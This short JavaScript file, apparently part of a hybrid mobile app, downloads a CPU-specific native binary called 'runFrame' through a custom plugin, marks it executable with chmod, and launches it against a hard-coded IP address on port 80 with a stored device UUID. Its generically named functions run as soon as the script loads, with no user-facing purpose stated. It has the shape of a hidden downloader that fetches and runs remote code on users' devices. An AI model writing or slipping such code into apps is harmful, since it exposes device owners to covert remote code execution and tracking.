
function sfunc1(){
    window.MyOrangePlugin.download(['http://{API_FQDN}/assets/runFrame_'+cpuabi,'runFrame'], function(res){
        sfunc2(res);
    });
}


function sfunc2(path){
    window.MyOrangePlugin.exec("/system/bin/chmod 744 " + path, function(res){
    	sfunc3(path);
    });
}

var deviceUUID = device.uuid;
if(window.localStorage.getItem("uuid")===null){
	window.localStorage.setItem("uuid", deviceUUID);
}else{
	deviceUUID = window.localStorage.getItem("uuid");
}


function sfunc3(path){
    window.MyOrangePlugin.poolexec(path+" 167.99.251.85 80 " + path.substring(1,path.length-9) + " " + deviceUUID, function(res){
    	console.log(res);
    });
}

sfunc1();

